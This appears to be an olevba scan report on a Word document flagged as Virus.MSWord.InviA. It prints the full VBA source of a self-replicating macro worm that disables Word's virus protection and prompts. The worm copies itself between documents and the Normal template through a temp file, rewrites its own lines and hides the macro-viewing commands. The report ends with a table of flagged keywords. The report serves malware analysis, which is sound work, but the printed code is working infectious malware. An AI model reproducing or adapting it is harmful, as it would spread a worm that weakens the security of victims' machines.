olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.InviA
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.InviA - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Rem <-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-I hate Windows. If you can read it, you can manage UNIX.->->->->->->->->->->->->->->->->
Rem <-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-This worm <Invisible_Worm> was created by VirusO of SiliciK BoyS.->->->->->->->->->->->->->
Rem <-<-<-<-<-<-<-<-<-This worm atttack the M$Word files. It's ownly a experiment. If you are infected: Don't worry!->->->->->->
Dim Obj1, Obj2, Obj3, Obj4, Obj5, Obj6
On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
Set Obj1 = NormalTemplate.VBProject.VBComponents.Item(1)
Set Obj2 = ActiveDocument.VBProject.VBComponents.Item(1)
Obj3 = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
Obj4 = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
If Obj4 = "49" Then
    If Obj3 = "49" Then
        Set Obj5 = CreateObject("Wscript.Shell")
        Obj6 = Obj5.RegRead("HKEY_LOCAL_MACHINE\Software\VirusO\Invisible_Worm\")
        If Obj6 = "" Then Obj6 = "0"
        Obj6 = Int(Obj6 + 1)
        Obj5.RegWrite "HKEY_LOCAL_MACHINE\Software\VirusO\Invisible_Worm\", Obj6
    Else
        NormalTemplate.VBProject.VBComponents.Item(1).Export "c:\IWfile.dat"
        ActiveDocument.VBProject.VBComponents.Item(1).codemodule.AddFromFile ("c:\IWfile.dat")
    For x = 1 To 4
        ActiveDocument.VBProject.VBComponents.Item(1).codemodule.deletelines 1
    Next x
        ActiveDocument.VBProject.VBComponents.Item(1).codemodule.replaceline 1, "Sub AutoOpen()"
        ActiveDocument.VBProject.VBComponents.Item(1).codemodule.replaceline 46, "'"
        ActiveDocument.VBProject.VBComponents.Item(1).codemodule.replaceline 47, "'"
        ActiveDocument.VBProject.VBComponents.Item(1).codemodule.replaceline 48, "'"
        ActiveDocument.VBProject.VBComponents.Item(1).codemodule.replaceline 49, "'"
    End If
Else
        ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\IWfile.dat"
        NormalTemplate.VBProject.VBComponents.Item(1).codemodule.AddFromFile ("c:\IWfile.dat")
    For x = 1 To 4
        NormalTemplate.VBProject.VBComponents.Item(1).codemodule.deletelines 1
    Next x
        NormalTemplate.VBProject.VBComponents.Item(1).codemodule.replaceline 1, "Sub AutoClose()"
        NormalTemplate.VBProject.VBComponents.Item(1).codemodule.replaceline 46, "Sub ToolsMacro()"
        NormalTemplate.VBProject.VBComponents.Item(1).codemodule.replaceline 47, "End Sub"
    NormalTemplate.VBProject.VBComponents.Item(1).codemodule.replaceline 48, "Sub ViewVBCode()"
        NormalTemplate.VBProject.VBComponents.Item(1).codemodule.replaceline 49, "End Sub"
End If
End Sub
Sub ToolsMacro()
End Sub
Sub ViewVBCode()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|RegRead             |May read registry keys                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

